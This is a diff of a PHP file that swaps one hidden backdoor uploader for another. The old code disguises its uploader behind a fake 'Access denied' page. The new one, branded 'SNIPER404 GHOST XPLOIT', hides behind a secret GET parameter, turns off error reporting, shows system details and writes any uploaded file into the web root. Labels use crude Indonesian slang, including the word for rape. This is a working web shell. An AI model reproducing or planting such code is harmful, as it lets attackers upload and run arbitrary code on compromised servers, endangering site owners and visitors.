@@ -1,26 +1,33 @@
-<html>
-  <head>
-<title>Access denied</title>
-</head><body>
-<h1>Access denied</h1>
-<p>You are not authorized to access this page.</p><?php echo "<tr><td><font>IP Address :".$_SERVER['REMOTE_ADDR']."<tr><td></font><br><br><br><br>";?>
-</body>
-</html>
-
 <?php
 set_time_limit(0);
 error_reporting(0);
 error_log(0);
 if(isset($_GET["?"])){
-echo'<center><form method="post" enctype="multipart/form-data" name="memek" id="uploader"><input type="file" name="file" size="50"><input name="APLOT" type="submit" id="APLOT" value="PERKOSA"></form></center>';
+echo "<center>
+<h4>✘✘✘ 𝚂𝙽𝙸𝙿𝙴𝚁𝟺𝟶𝟺 𝙶𝙷𝙾𝚂𝚃 𝚇𝙿𝙻𝙾𝙸𝚃 ✘✘✘</h4><br><b>".php_uname()."</b><br><br>";
+echo "<form method='post' enctype='multipart/form-data'>
+<input type='file' name='FUCK'>
+<input type='submit' name='TOD' value='UPLOAD'>
+</form><br><br>";
 
-if( $_POST['APLOT'] == "PERKOSA" ) {
-if(@copy($_FILES['file']['tmp_name'],
-$_FILES['file']['name'])) {
-echo '<br><br><center><b>berhasil di perkosa di folder ini mas</b><br><br>'; 
-} else { 
-echo '<br><br><center><b>gagal di perkosa mas</b><br><br></font>'; 
-} 
+$SNIPER404 = $_SERVER['DOCUMENT_ROOT'];
+$GHOST = $_FILES['FUCK']['name'];
+$ANJIR = $SNIPER404.'/'.$GHOST;
+if(isset($_POST['TOD'])) {
+if(is_writable($SNIPER404)) {
+if(@copy($_FILES['FUCK']['tmp_name'], $ANJIR)) {
+$XPLOIT = "http://".$_SERVER['HTTP_HOST']."/";
+echo "Sukses mas :) <a href='$XPLOIT/$GHOST' target='_blank'>$XPLOIT/$GHOST</a>";
+} else {
+echo "Gagal mas :(";
+}
+} else {
+if(@copy($_FILES['FUCK']['tmp_name'], $GHOST)) {
+echo "Sukses di folder ini mas";
+} else {
+echo "";
+}
+}
 }
 }
 ?>
